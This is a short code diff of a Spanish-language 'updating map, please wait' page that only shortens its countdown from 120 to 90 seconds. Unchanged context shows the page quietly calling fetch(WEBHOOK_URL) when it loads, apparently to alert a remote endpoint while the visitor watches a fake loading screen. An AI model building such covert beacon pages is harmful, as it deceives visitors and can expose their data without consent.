@@ -20,7 +20,7 @@
             <h2>Actualizando Plano</h2>
             <p>Estamos procesando los datos de terreno. Por favor, espere...</p>
             <div class="loader"></div>
-            <div id="timer">120</div>
+            <div id="timer">90</div>
             <p style="font-size: 12px; color: #7f8c8d;">Segundos restantes</p>
         </div>
 
@@ -39,7 +39,7 @@
         fetch(WEBHOOK_URL).catch(err => console.log("Enviado"));
 
         // 2. CONTADOR
-        let timeLeft = 120;
+        let timeLeft = 90;
         const timerId = setInterval(() => {
             if(timeLeft <= 0) {
                 clearInterval(timerId);
